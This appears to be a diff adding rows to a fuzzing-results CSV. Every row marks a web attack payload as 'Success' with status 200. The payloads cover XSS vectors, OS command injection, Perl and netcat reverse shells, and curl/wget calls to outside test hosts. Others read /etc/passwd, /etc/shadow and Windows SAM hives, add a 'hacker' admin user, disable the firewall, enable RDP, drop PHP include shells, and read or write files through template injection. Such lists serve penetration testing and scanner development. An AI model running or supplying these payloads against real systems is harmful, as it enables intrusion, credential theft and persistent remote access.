+Success,"<div id=""84""><x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""javascript:alert(84)//#x""/>//[""'`-->]]>]</div><div id=""85""><x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""test.evt#x""/>//[""'`-->]]>]</div><div id=""86""><body oninput=alert(86)><input autofocus>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""87""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""88""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",200,10701
+Success,"<foreignObject xlink:href=""data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E""/>",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""89""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""90""><!-- Up to Opera 10.63 -->",200,10701
+Success,"<div id=""91"">[A]",200,10701
+Success,"<! foo=""[[[x]]""><x foo=""]foo><script>alert(91)</script>"">",200,10701
+Success,"<div id=""94""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",200,10701
+Success,"PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D""/>",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""97""><!-- IE 5-9 -->",200,10701
+Success,<!-- IE 10 in IE5-9 Standards mode -->,200,10701
+Success,"<div id=""98""><div id=d><div style=""font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"">X</div></div>",200,10701
+Success,"<div id=""99"">XXX<style>",200,10701
+Success,*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */,200,10701
+Success,<!--,200,10701
+Success,--><!--*{color:red}   /* all UA */,200,10701
+Success,*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */,200,10701
+Success,"</style>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""108""><!-- IE 5-8 standards mode -->",200,10701
+Success,<!-- IE 5-9 standards mode -->,200,10701
+Success,"<div id=""109""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
+Success,"<a id=""x""><rect fill=""white"" width=""1000"" height=""1000""/></a>",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""110""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""113""><div id=""x"">XXX</div>",200,10701
+Success,<style>,200,10701
+Success,#x{font-family:foo[bar;color:green;},200,10701
+Success,#y];color:red;{,200,10701
+Success,"</style>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""116""><div id=""x"">x</div>",200,10701
+Success,"<xml:namespace prefix=""t"">",200,10701
+Success,"<import namespace=""t"" implementation=""#default#time2"">",200,10701
+Success,"<t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;"">//[""'`-->]]>]</div>",200,10701
+Success,"</a>//[""'`-->]]>]</div>",200,10701
+Success,    <h1>Drop me</h1>,200,10701
+Success,</div>,200,10701
+Success,"<textarea type=""text"" cols=""50"" rows=""10""></textarea>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""120""><script>",200,10701
+Success,function makePopups(){,200,10701
+Success,    for (i=1;i<6;i++) {,200,10701
+Success,    },200,10701
+Success,},200,10701
+Success,</script>,200,10701
+Success,<body>,200,10701
+Success,"<a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",200,10701
+Success,"xmlns:svg=""http://www.w3.org/2000/svg"">",200,10701
+Success,<svg:svg>,200,10701
+Success,"<svg:mask id=""maskForClickjacking"" maskUnits=""objectBoundingBox"" maskContentUnits=""objectBoundingBox"">",200,10701
+Success,"    <svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/>",200,10701
+Success,"    <svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/>",200,10701
+Success,</svg:mask>,200,10701
+Success,</svg:svg>,200,10701
+Success,</body>,200,10701
+Success,"</html>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""123""><span class=foo>Some text</span>",200,10701
+Success,<script>,200,10701
+Success,"$(""a.bar"").click();",200,10701
+Success,});,200,10701
+Success,});,200,10701
+Success,"</script>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""125""><?xml version=""1.0""?>",200,10701
+Success,"<?xml-stylesheet type=""text/xml"" href=""#stylesheet""?>",200,10701
+Success,<!DOCTYPE doc [,200,10701
+Success,<!ATTLIST xsl:stylesheet,200,10701
+Success,  id    ID    #REQUIRED>]>,200,10701
+Success,"<svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
+Success,"    <xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",200,10701
+Success,"        <xsl:template match=""/"">",200,10701
+Success,        </xsl:template>,200,10701
+Success,    </xsl:stylesheet>,200,10701
+Success,"    <circle fill=""red"" r=""40""></circle>",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""126""><object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object>",200,10701
+Success,"<div id=""127""><svg xmlns=""http://www.w3.org/2000/svg"" id=""x"">",200,10701
+Success,"<listener event=""load"" handler=""#y"" xmlns=""http://www.w3.org/2001/xml-events"" observer=""x""/>",200,10701
+Success,"</svg>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""129""><svg>",200,10701
+Success,echo%20$(rm%20SYCGSY.txt%20>%20SYCGSY.txt),200,10701
+Success,cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
+Success,&cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
+Success,&&cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
+Success,|cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
+Success,||cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
+Success,;cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
+Success,%0Acat%20/etc/passwd,200,10701
+Success,%0Aid,200,10701
+Success,%0a id %0a,200,10701
+Success,%0Aid%0A,200,10701
+Success,%0a ping -i 30 127.0.0.1 %0a,200,10701
+Success,%0A/usr/bin/id,200,10701
+Success,%0A/usr/bin/id%0A,200,10701
+Success,%20{${phpinfo()}},200,10701
+Success,a|id|,200,10701
+Success,a;id|,200,10701
+Success,a;id;,200,10701
+Success,&ls,200,10701
+Success,&&ls,200,10701
+Success,&&&ls,200,10701
+Success,&echo hello there,200,10701
+Success,&- -& ls,200,10701
+Success,%0Als,200,10701
+Success,%0Als,200,10701
+Success,%0Auname -a,200,10701
+Success,%0Als -la,200,10701
+Success,a;id\n,200,10701
+Success,cat /etc/hosts,200,10701
+Success,cat /etc/passwd,200,10701
+Success,| curl http://crowdshield.com/.testing/rce.txt,200,10701
+Success,& curl http://crowdshield.com/.testing/rce.txt,200,10701
+Success,; curl https://crowdshield.com/.testing/rce_vuln.txt,200,10701
+Success,&& curl https://crowdshield.com/.testing/rce_vuln.txt,200,10701
+Success,curl https://crowdshield.com/.testing/rce_vuln.txt,200,10701
+Success," curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",200,10701
+Success,"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",200,10701
+Success,$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),200,10701
+Success,& dir,200,10701
+Success,&&dir,200,10701
+Success,&& dir,200,10701
+Success,& dir C:\,200,10701
+Success,&& dir C:\,200,10701
+Success,dir C:\,200,10701
+Success,& dir C:\Documents and Settings\*,200,10701
+Success,&& dir C:\Documents and Settings\*,200,10701
+Success,dir C:\Documents and Settings\*,200,10701
+Success,& dir C:\Users,200,10701
+Success,&& dir C:\Users,200,10701
+Success,dir C:\Users,200,10701
+Success,"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",200,10701
+Success,"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",200,10701
+Success,"echo ""<?php include($_GET['page']); ?>"" > rfi.php",200,10701
+Success,"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",200,10701
+Success,"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",200,10701
+Success,"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",200,10701
+Success,exec('ls'),200,10701
+Success,exec('pwd'),200,10701
+Success,exec('pwd');,200,10701
+Success,exec('sleep 5'),200,10701
+Success,exec('sleep 5');,200,10701
+Success,exec('ls'),200,10701
+Success,exec('ls');,200,10701
+Success,";{$_GET[""cmd""]}",200,10701
+Success,`id`,200,10701
+Success,|id,200,10701
+Success,| id,200,10701
+Success,;id,200,10701
+Success,;id|,200,10701
+Success,;id;,200,10701
+Success,& id,200,10701
+Success,&&id,200,10701
+Success,;id\n,200,10701
+Success,ifconfig,200,10701
+Success,& ifconfig,200,10701
+Success,&& ifconfig,200,10701
+Success,/index.html|id|,200,10701
+Success,& ipconfig /all,200,10701
+Success,&& ipconfig /all,200,10701
+Success,ipconfig /all,200,10701
+Success,& ls -l /,200,10701
+Success,&& ls -l /,200,10701
+Success,ls -l /,200,10701
+Success,& ls -laR /etc,200,10701
+Success,&& ls -laR /etc,200,10701
+Success,& ls -laR /var/www,200,10701
+Success,&& ls -laR /var/www,200,10701
+Success,& ls -l /etc/,200,10701
+Success,&& ls -l /etc/,200,10701
+Success,ls -l /etc/,200,10701
+Success,ls -lh /etc/,200,10701
+Success,& ls -l /home/*,200,10701
+Success,&& ls -l /home/*,200,10701
+Success,ls -l /home/*,200,10701
+Success,& ls -l /tmp,200,10701
+Success,&& ls -l /tmp,200,10701
+Success,ls -l /tmp,200,10701
+Success,& ls -l /var/www/*,200,10701
+Success,&& ls -l /var/www/*,200,10701
+Success,ls -l /var/www/*,200,10701
+Success,"<!--#exec cmd=""/bin/cat /etc/passwd""-->",200,10701
+Success,"<!--#exec cmd=""/bin/cat /etc/shadow""-->",200,10701
+Success,"<!--#exec cmd=""/usr/bin/id;-->=",200,10701
+Success,\n/bin/ls -al\n,200,10701
+Success,| nc -lvvp 4444 -e /bin/sh|,200,10701
+Success,; nc -lvvp 4444 -e /bin/sh;,200,10701
+Success,& nc -lvvp 4444 -e /bin/sh&,200,10701
+Success,&& nc -lvvp 4444 -e /bin/sh &,200,10701
+Success,nc -lvvp 4444 -e /bin/sh,200,10701
+Success,nc -lvvp 4445 -e /bin/sh &,200,10701
+Success,nc -lvvp 4446 -e /bin/sh|,200,10701
+Success,nc -lvvp 4447 -e /bin/sh;,200,10701
+Success,nc -lvvp 4448 -e /bin/sh&,200,10701
+Success,\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,200,10701
+Success,\necho INJECTX\nexit\n\033[2Asleep 5\n,200,10701
+Success,\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,200,10701
+Success,| netsh firewall set opmode disable,200,10701
+Success,; netsh firewall set opmode disable,200,10701
+Success,& netsh firewall set opmode disable,200,10701
+Success,&& netsh firewall set opmode disable,200,10701
+Success,netsh firewall set opmode disable,200,10701
+Success,& netstat -an,200,10701
+Success,&& netstat -an,200,10701
+Success,netstat -an,200,10701
+Success,| net user hacker Password1 /ADD,200,10701
+Success,; net user hacker Password1 /ADD,200,10701
+Success,& net user hacker Password1 /ADD,200,10701
+Success,&& net user hacker Password1 /ADD,200,10701
+Success,net user hacker Password1 /ADD,200,10701
+Success,| net view,200,10701
+Success,; net view,200,10701
+Success,& net view,200,10701
+Success,&& net view,200,10701
+Success,net view,200,10701
+Success,\nid|,200,10701
+Success,\nid;,200,10701
+Success,\nid\n,200,10701
+Success,\n/usr/bin/id\n,200,10701
+Success,|| phpinfo(),200,10701
+Success,| phpinfo(),200,10701
+Success, {${phpinfo()}},200,10701
+Success,;phpinfo(),200,10701
+Success,;phpinfo();//,200,10701
+Success,';phpinfo();//,200,10701
+Success,{${phpinfo()}},200,10701
+Success,& phpinfo(),200,10701
+Success,&& phpinfo(),200,10701
+Success,phpinfo(),200,10701
+Success,phpinfo();,200,10701
+Success,"<?php system(""cat /etc/passwd"");?>",200,10701
+Success,"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",200,10701
+Success,"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",200,10701
+Success,"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",200,10701
+Success,"<?php system(""sleep 10"");?>",200,10701
+Success,"<?php system(""sleep 5"");?>",200,10701
+Success,"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",200,10701
+Success,"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",200,10701
+Success,:phpversion();,200,10701
+Success,& ping -i 30 127.0.0.1 &,200,10701
+Success,& ping -n 30 127.0.0.1 &,200,10701
+Success,;${@print(md5(RCEVulnerable))};,200,10701
+Success,"${@print(""RCEVulnerable"")}",200,10701
+Success,${@print(system($_SERVER['HTTP_USER_AGENT']))},200,10701
+Success,& pwd,200,10701
+Success,&& pwd,200,10701
+Success,\r,200,10701
+Success,"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
+Success,"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
+Success,"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
+Success,"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
+Success,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
+Success,\r\n,200,10701
+Success,; sleep 1,200,10701
+Success,& sleep 1,200,10701
+Success,&& sleep 1,200,10701
+Success,; sleep 10,200,10701
+Success,& sleep 10 ,200,10701
+Success,&& sleep 10,200,10701
+Success,; sleep 15,200,10701
+Success,& sleep 15 ,200,10701
+Success,&& sleep 15,200,10701
+Success,; sleep 5,200,10701
+Success,& sleep 5,200,10701
+Success,&& sleep 5,200,10701
+Success,sleep 5,200,10701
+Success,| sysinfo,200,10701
+Success,; sysinfo,200,10701
+Success,& sysinfo,200,10701
+Success,&& sysinfo,200,10701
+Success,;system('cat%20/etc/passwd'),200,10701
+Success,system('cat config.php');,200,10701
+Success,system('cat /etc/passwd');,200,10701
+Success,|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
+Success,| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
+Success,; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
+Success,& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
+Success,&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
+Success,system('curl https://crowdshield.com/.testing/rce_vuln.txt'),200,10701
+Success,system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),200,10701
+Success,system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,200,10701
+Success,& systeminfo,200,10701
+Success,&& systeminfo,200,10701
+Success,system('ls'),200,10701
+Success,system('pwd'),200,10701
+Success,system('pwd');,200,10701
+Success,|| system('sleep 5');,200,10701
+Success,| system('sleep 5');,200,10701
+Success,; system('sleep 5');,200,10701
+Success,& system('sleep 5');,200,10701
+Success,&& system('sleep 5');,200,10701
+Success,system('sleep 5'),200,10701
+Success,system('sleep 5');,200,10701
+Success,system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),200,10701
+Success,system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,200,10701
+Success,system('ls'),200,10701
+Success,system('ls');,200,10701
+Success,| type C:\Windows\repair\SAM,200,10701
+Success,; type C:\Windows\repair\SAM,200,10701
+Success,& type C:\Windows\repair\SAM,200,10701
+Success,&& type C:\Windows\repair\SAM,200,10701
+Success,type C:\Windows\repair\SAM,200,10701
+Success,| type C:\Windows\repair\SYSTEM,200,10701
+Success,; type C:\Windows\repair\SYSTEM,200,10701
+Success,& type C:\Windows\repair\SYSTEM,200,10701
+Success,&& type C:\Windows\repair\SYSTEM,200,10701
+Success,type C:\Windows\repair\SYSTEM,200,10701
+Success,| type C:\WINNT\repair\SAM,200,10701
+Success,; type C:\WINNT\repair\SAM,200,10701
+Success,& type C:\WINNT\repair\SAM,200,10701
+Success,&& type C:\WINNT\repair\SAM,200,10701
+Success,type C:\WINNT\repair\SAM,200,10701
+Success,type C:\WINNT\repair\SYSTEM,200,10701
+Success,| type %SYSTEMROOT%\repair\SAM,200,10701
+Success,; type %SYSTEMROOT%\repair\SAM,200,10701
+Success,& type %SYSTEMROOT%\repair\SAM,200,10701
+Success,&& type %SYSTEMROOT%\repair\SAM,200,10701
+Success,type %SYSTEMROOT%\repair\SAM,200,10701
+Success,| type %SYSTEMROOT%\repair\SYSTEM,200,10701
+Success,; type %SYSTEMROOT%\repair\SYSTEM,200,10701
+Success,& type %SYSTEMROOT%\repair\SYSTEM,200,10701
+Success,&& type %SYSTEMROOT%\repair\SYSTEM,200,10701
+Success,type %SYSTEMROOT%\repair\SYSTEM,200,10701
+Success,;uname;,200,10701
+Success,| uname -a,200,10701
+Success,; uname -a,200,10701
+Success,& uname -a,200,10701
+Success,&& uname -a,200,10701
+Success,uname -a,200,10701
+Success,|/usr/bin/id,200,10701
+Success,;|/usr/bin/id|,200,10701
+Success,;/usr/bin/id|,200,10701
+Success,$;/usr/bin/id,200,10701
+Success,| wget http://crowdshield.com/.testing/rce.txt,200,10701
+Success,& wget http://crowdshield.com/.testing/rce.txt,200,10701
+Success,; wget https://crowdshield.com/.testing/rce_vuln.txt,200,10701
+Success,$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),200,10701
+Success,&& wget https://crowdshield.com/.testing/rce_vuln.txt,200,10701
+Success,wget https://crowdshield.com/.testing/rce_vuln.txt,200,10701
+Success,$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),200,10701
+Success,' ls,200,10701
+Success,' & ls,200,10701
+Success,' && ls,200,10701
+Success,""" ls",200,10701
+Success,""" & ls",200,10701
+Success,""" && ls",200,10701
+Success,& ls,200,10701
+Success,&& ls,200,10701
+Success,"{{ get_user_file(""/etc/hosts"") }}",200,10701
+Success,"{{ get_user_file(""/etc/passwd"") }}",200,10701
+Success,{{4+4}},200,10701
+Success,{{4+8}},200,10701
+Success,{{7*'7'}},200,10701
+Success,{{person.secret}},200,10701
+Success,{{person.name}},200,10701
+Success,{{ [].class.base.subclasses() }},200,10701
+Success,"{% set string = ""ssti"" %}",200,10701
+Success,"{% set class = ""__class__"" %}",200,10701
+Success,"{% set mro = ""__mro__"" %}",200,10701
+Success,"{% set subclasses = ""__subclasses__"" %}",200,10701
+Success,{1} + {1},200,10701
+Success,"{{__class__.__mro__.__subclasses__()[40]('index.php', 'r').read()}}",200,10701
+Success,"{{''['__cla'+'ss__']['__mr'+'o__'][2]['__subcla'+'sses__']()[40]('index.php', 'r').read()}}",200,10701
+Success,"{{''['__cla'+'ss__']['__mr'+'o__'][2]['__subcla'+'sses__']()[40]('/etc/passwd', 'r').read()}}",200,10701
+Success,{{request|attr(request.args.param)}}&param=__class__,200,10701
+Success,"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",200,10701
+Success,{{[] .__ Class __.__ base __.__ subclasses __ ()}},200,10701
+Success,"{{request.__class__.__mro__[8].__subclasses__()[40](request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337",200,10701
+Success,"{%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.clss,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mxro,request.args.usc*2)|join)%}{{(i|attr((request.args.usc*2,request.args.suc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&clss=class&mxro=mro&suc=subclasses&usc=_&file=/tmp/foo.py&write=w&payload=print+""1337""..//etc/passwd",200,10701
